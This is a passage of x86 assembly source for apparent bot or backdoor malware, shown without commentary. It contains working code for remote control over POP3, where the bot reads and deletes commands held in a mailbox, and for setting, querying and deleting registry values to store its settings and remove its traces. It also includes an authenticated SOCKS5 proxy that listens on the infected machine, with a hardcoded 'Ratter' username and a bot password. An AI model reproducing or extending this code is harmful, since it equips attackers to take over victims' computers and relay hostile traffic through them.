    call heap_alloc
    xchg eax, edi
    
    push edi
    call find_replacementz

    mov eax, CR_LF
    stosw
    
    pop esi
    sub edi, esi

    push 0
    push edi
    push esi
    push dword ptr [pop3_handle]
    call send

    push esi
    call heap_free
    
    push dword ptr [temp_buffer]
    call heap_free

        pop edi

        and dword ptr [edi], 0

        push edi

pop3_send_command_loop:
    push 0
    push 1
    push edi
    push dword ptr [pop3_handle]
    call recv

        cmp eax, 1
        jnz pop3_send_command_end

        inc edi

        cmp byte ptr [edi-1], 0ah
        jnz pop3_send_command_loop

pop3_send_command_end:
    pop edi
    mov eax, dword ptr [edi]
    and eax, 0ffffffh
    cmp eax, OK
    retn

online_sleep:
    push ebx
    xchg eax, ebx

online_sleep_loop:
    cmp dword ptr [online_flag], 1
    jz online_sleep_go_on
    stc
    jmp online_sleep_end

online_sleep_go_on:
    push 100
    call Sleep

    sub ebx, 100
    jnz online_sleep_loop

    clc
online_sleep_end:
    pop ebx
    retn
    
pop3_get_response   proc
    local   response:DWORD
    local   response_:DWORD

    push 0
    push 4
    lea eax, [response]
    push eax
    push dword ptr [pop3_handle]
    call recv

    cmp eax, 4
    jnz pop3_get_response_end_error

pop3_get_response_loop:
    push 0
    push 1
    lea eax, [response_]
    push eax
    push dword ptr [pop3_handle]
    call recv
    
    cmp eax, 1
    jnz pop3_get_response_end_error
    cmp byte ptr [response_], 0ah
    jnz pop3_get_response_loop

    clc
    jmp pop3_get_response_end_error+1

pop3_get_response_end_error:
    stc                  
    mov eax, dword ptr [response]
    and eax, 0ffffffh
    leave
    retn
pop3_get_response   endp

; in: eax - message number to start with
;     ecx - how much messages from message[eax] to delete
delete_messagez:
    push ecx
    push eax

    lea edi, [email_message_buffer]
    call _convert_num_

    xor eax, eax
    stosb
    
    lea esi, [pop3_dele]
    call pop3_send_command
    pop eax
    pop ecx
    stc
    jnz delete_messagez_error
    
    inc eax
    loop delete_messagez
    clc
delete_messagez_error:
    retn

; in: ecx - Key
;     edx - SubKey
;     ebx - ValueType (REG_SZ, REG_DWORD only!)
;     edi - ValueName
;     esi - DataToStore
reg_set_value:
    pushad
    xor eax, eax
    @pushvar <dd    ?>
    @pushvar <reg_key_handle    dd  ?>
    push eax
    push KEY_QUERY_VALUE or KEY_SET_VALUE
    push eax
    push eax
    push eax
    push edx
    push ecx
    call RegCreateKeyExA
    test eax, eax
    jnz reg_set_value_end

    mov eax, ebx
    
    cmp ebx, REG_SZ
    jnz reg_set_value_next

        push esi
    call lstrlen
    
reg_set_value_next:
    push eax
    push esi
    push ebx
    push 0
    push edi
    mov ebx, dword ptr [reg_key_handle]
    push ebx
    call RegSetValueExA

    push eax
    push ebx
    call RegCloseKey
    pop eax
reg_set_value_end:
    test eax, eax
    mov dword ptr [esp.Pushad_eax], eax
    popad
    retn

; in: ecx - Key
;     edx - SubKey
;     ebx - MaxBufferSize
;     edi - ValueName
;     esi - Buffer
reg_query_value:
    pushad
    xor eax, eax
    @pushvar <dd    ?>
    @pushvar <reg_query_key_handle  dd  ?>
    push eax
    push KEY_QUERY_VALUE or KEY_SET_VALUE
    push eax
    push eax
    push eax
    push edx
    push ecx
    call RegCreateKeyExA
    test eax, eax
    jnz reg_query_value_end

    mov dword ptr [lpcbData], ebx
    @pushvar <lpcbData  dd  ?>
    push esi
    @pushvar <dd    ?>
    push 0
    push edi
    mov ebx, dword ptr [reg_query_key_handle]
    push ebx
    call RegQueryValueExA

    push eax
    push ebx
    call RegCloseKey
    pop eax
reg_query_value_end:
    test eax, eax
    mov dword ptr [esp.Pushad_eax], eax
    popad
    retn

; in: ecx - Key
;     edx - SubKey
;     edi - ValueName
reg_delete_value:
    pushad
    xor eax, eax
    @pushvar <dd    ?>
    @pushvar <reg_delete_value_handle   dd  ?>
    push eax
    push KEY_QUERY_VALUE or KEY_SET_VALUE
    push eax
    push eax
    push eax
    push edx
    push ecx
    call RegCreateKeyExA
    test eax, eax
    jnz reg_delete_value_end

    push edi
    mov ebx, dword ptr [reg_delete_value_handle]
    push ebx
    call RegDeleteValueA

    push eax
    push ebx
    call RegCloseKey
    pop eax
reg_delete_value_end:
    test eax, eax
    mov dword ptr [esp.Pushad_eax], eax
    popad
    retn

; in: ecx - Key
;     ebx - SubKey
reg_delete_key:
    pushad
    xor eax, eax
    @pushvar <dd    ?>
    @pushvar <reg_delete_key_handle dd  ?>
    push eax
    push KEY_QUERY_VALUE or KEY_SET_VALUE
    push eax
    push eax
    push eax
    @pushsz ""
    push ecx
    call RegCreateKeyExA
    test eax, eax
    jnz reg_delete_key_end

    push ebx
    mov ebx, dword ptr [reg_delete_key_handle]
    push ebx
    call RegDeleteKeyA

    push eax
    push ebx
    call RegCloseKey
    pop eax
reg_delete_key_end:
    test eax, eax
    mov dword ptr [esp.Pushad_eax], eax
    popad
    retn

delete_registry_:
    call delete_registry

    lea ebx, [hu_subkey]
    mov ecx, HKEY_USERS
    call reg_delete_key
    retn

delete_registry:
    mov dword ptr [registry_fc], offset reg_delete_value
    jmp registry
    
query_registry:
    mov dword ptr [registry_fc], offset reg_query_value
    jmp registry

set_default_settingz:
    lea esi, [default_settingz]
set_registry:
    mov dword ptr [registry_fc], offset reg_set_value
    
; in: esi - RegistryStructure
registry:
    pushad
    lodsd
    xchg eax, ecx
    
    lodsd
    xchg eax, edx
    
    lodsd
    xchg eax, ebp
    
registry_loop:

    push ecx
    push edx

    lodsd
    xchg eax, ebx

    lodsd
    xchg eax, edi
    
    lodsd
    push esi
    xchg eax, esi

    mov eax, 12345678h
registry_fc equ $-4
    call eax
    
    pop esi
    pop edx
    pop ecx
    
    test eax, eax
    jnz registry_end

    dec ebp
    jnz registry_loop
    
registry_end:
    test eax, eax
    mov dword ptr [esp.Pushad_eax], eax
    popad
    retn
    
soxz_proxy  proc
    local   soxz_socket:DWORD
    local   soxz_sin:sockaddr_in
    local   soxz_conn_port:DWORD
    local   soxz_server_sock:DWORD
    local   soxz_cur_sock:DWORD
    local   soxz_fds:fd_set
    local   soxz_time_out:timeval

    @SEH_SetupFrame <jmp soxz_proxy_main_end>

soxz_proxy_main_loop:
    cmp dword ptr [online_flag], 1
    jnz soxz_proxy_main_end

    mov eax, 2000
    call heap_alloc
    xchg eax, edi

    push 0
    push SOCK_STREAM
    push AF_INET
    call socket
    inc eax
    jz soxz_proxy_end
    dec eax
    mov dword ptr [soxz_socket], eax
    
    mov dword ptr [soxz_sin.sin_family], AF_INET
    xor eax, eax

    push edi

    lea edi, [soxz_sin.sin_zero]
    stosd
    stosd
    mov dword ptr [soxz_sin.sin_addr], eax

    pop edi
    
    push SOXZ_PORT
    call htons
    mov word ptr [soxz_sin.sin_port], ax

    lea eax, [soxz_sin]
    push type(sockaddr_in)
    push eax
    push dword ptr [soxz_socket]
    call bind
    test eax, eax
    jnz soxz_proxy_end_close_socket

    push 3
    push dword ptr [soxz_socket]
    call listen
    test eax, eax
    jnz soxz_proxy_end_close_socket

    push eax
    push eax
    push dword ptr [soxz_socket]
    call accept

    xchg eax, esi

        mov ecx, dword ptr [soxz_proxy_fcz]
        xor edx, edx

soxz_proxy_aut_loop:
        push ecx
        push edx

        call read_socket_soxz
        jz soxz_proxy_end_close_socket_

        pop edx

        pushad
        call dword ptr [soxz_proxy_fcz+4+edx*4]
        mov dword ptr [esp.Pushad_eax], eax
        popad
        jc soxz_proxy_end_close_socket_

        push edx
        call write_socket_soxz
        pop edx
        jz soxz_proxy_end_close_socket_

    pop ecx

    inc edx
    loop soxz_proxy_aut_loop

    mov eax, dword ptr [soxz_server_sock]
    mov dword ptr [soxz_cur_sock], eax

soxz_main_read_loop:
    cmp dword ptr [online_flag], 1
    jnz soxz_proxy_end_close_socket__

        lea ecx, [soxz_time_out]
    mov dword ptr [ecx.tv_sec], 0
    mov dword ptr [ecx.tv_usec], 500
    
        lea ebx, [soxz_fds]
    mov dword ptr [ebx.fd_count], 1
    push esi
    pop dword ptr [ebx.fd_array]

    xor eax, eax
    push ecx
    push eax
    push eax
    push ebx
    push eax
    call select
    xchg eax, ecx
    jecxz soxz_main_read_loop_timeout
    inc ecx
    jz soxz_proxy_end_close_socket__

    call read_socket_soxz
    test eax, eax
    jz soxz_proxy_end_close_socket__
    inc eax
    jz soxz_proxy_end_close_socket__
    dec eax

        xchg esi, dword ptr [soxz_cur_sock]

    call write_socket_soxz
    test eax, eax
    jz soxz_proxy_end_close_socket__
    inc eax
    jz soxz_proxy_end_close_socket__
    dec eax

    mov eax, 200
    call online_sleep
    jc soxz_proxy_end_close_socket__

    jmp soxz_main_read_loop

soxz_main_read_loop_timeout:
    mov eax, 200
    call online_sleep
    jc soxz_proxy_end_close_socket__

        xchg esi, dword ptr [soxz_cur_sock]
    jmp soxz_main_read_loop

soxz_proxy_end_close_socket__:
    push dword ptr [soxz_cur_sock]
    call closesocket
soxz_proxy_end_close_socket_:
    push esi
    call closesocket
soxz_proxy_end_close_socket:
    push dword ptr [soxz_socket]
    call closesocket
soxz_proxy_end:
        push edi
    call heap_free

    cmp dword ptr [online_flag], 1
    jnz soxz_proxy_main_end

        jmp soxz_proxy_main_loop
soxz_proxy_main_end:
    @SEH_RemoveFrame
    push 0
    call ExitThread

soxz_proxy  endp

read_socket_soxz:
    push 0
    push 2000
    push edi
    push esi
    call recv
    test eax, eax
    retn

write_socket_soxz:
    push 0
    push eax
    push edi
    push esi
    call send
    test eax, eax
    retn

soxz_method:
    cmp byte ptr [edi], 05h
    jnz soxz_end_error

    push edi

    inc edi

    xor ecx, ecx
    mov cl, byte ptr [edi]

    push 02h
    pop eax

    inc edi

    repnz scasb
    pop edi
    jnz soxz_end_error

    mov byte ptr [edi+1], 02h

    push 2
    pop eax

    clc
    retn

soxz_end_error:
    stc
    retn


soxz_authentization:
        cmp byte ptr [edi], 1
    jnz soxz_end_error

    mov ebx, edi

    inc edi
    inc edi
    
    movzx edx, byte ptr [edi-1]

    mov esi, edi
    push edx
    call gimme_CRC32
    add edi, edx

    cmp eax, 0ab4ee342h             ; username Ratter
    jnz soxz_end_error

        inc edi
    
    movzx edx, byte ptr [edi-1]

    mov esi, edi
    push edx
    call gimme_CRC32
    add edi, edx

    cmp eax, dword ptr [bot_password]
    jnz soxz_end_error

    mov byte ptr [ebx], 01h
    and byte ptr [ebx+1], 0

    push 2
    pop eax

    clc
    retn

soxz_make_proxy:
        cmp byte ptr [edi], 5
    jnz soxz_end_error

    cmp byte ptr [edi+2], 0
    jnz soxz_end_error

    test byte ptr [edi+3], 03h
    jz soxz_end_error

    movzx ecx, byte ptr [edi+4]
    lea esi, [edi+5]
    movzx ebx, word ptr [edi+ecx+5]
    xchg bl, bh

    and byte ptr [edi+ecx+5], 0

    push ebx    
    call get_hostent
    pop ebx
    jz soxz_end_error
        
        push edi

    lea edi, [soxz_sin]
    call update_sin

    pop edi

    movzx eax, byte ptr [edi+1]
    dec eax

    call dword ptr [soxz_commandz+eax*4]
    jc soxz_end_error

    mov dword ptr [edi], 01000005h

    push ecx
    add edi, 5

    push edi

    call get_local_host
    
    push dword ptr [local_host_ip]
    call ntohl

    push eax
    call inet_ntoa

    pop edi

    mov edx, edi

    push edi
    @copy eax
    pop edi

    @endsz_
    sub edi, edx
    xchg edi, edx

    dec edx
    
    mov byte ptr [edi-1], dl

    add edi, edx
    pop ecx
    jecxz soxz_make_proxy_generate_port

    xchg cl, ch
    mov word ptr [edi], cx

    inc edi
    inc edi

    jmp soxz_make_proxy_end
soxz_make_proxy_generate_port:
    mov ebx, 3976
    push edx
    call get_random
    pop edx
    add eax, 1024

    mov dword ptr [soxz_conn_port], eax

    xchg al, ah
    stosw

soxz_make_proxy_end:

    mov eax, edx
    add eax, 7

        clc
        retn

soxz_make_connect:
    push 0
    push SOCK_STREAM
    push AF_INET
    call socket
    inc eax
    jz soxz_make_connect_end_error
    dec eax

    mov dword ptr [soxz_server_sock], eax

    lea eax, [soxz_sin]
    push type(sockaddr_in)
    push eax
    push dword ptr [soxz_server_sock]
    call connect
    test eax, eax
    jnz soxz_make_connect_end_close_socket

    mov ecx, SOXZ_PORT

    clc
    jmp soxz_make_connect_end_error+1
soxz_make_connect_end_close_socket:
    push dword ptr [soxz_server_sock]
    call closesocket

soxz_make_connect_end_error:
    stc
    retn

soxz_error:
    stc
    retn

setup_pop3_command:
    push 1
    pop eax
    call is_user_allowed
    jc setup_pop3_end
    
    call go_over_gapz
    jc setup_sms_end

    call $+25
    dd  4
    dd  offset pop3_email_addr
    dd  offset pop3_server
    dd  offset pop3_user_
    dd  offset pop3_password_
    pop ebx

    mov ecx, dword ptr [ebx]
    add ebx, 4

setup_pop3_command_loop:
    xchg esi, edi
    mov edi, dword ptr [ebx]
    call move_until_gap

    xchg esi, edi
    call go_over_gapz
        jc setup_pop3_command_set_registry

        add ebx, 4
    loop setup_pop3_command_loop

setup_pop3_command_set_registry:
    call set_default_settingz

        clc
setup_pop3_end:
    retn

end start
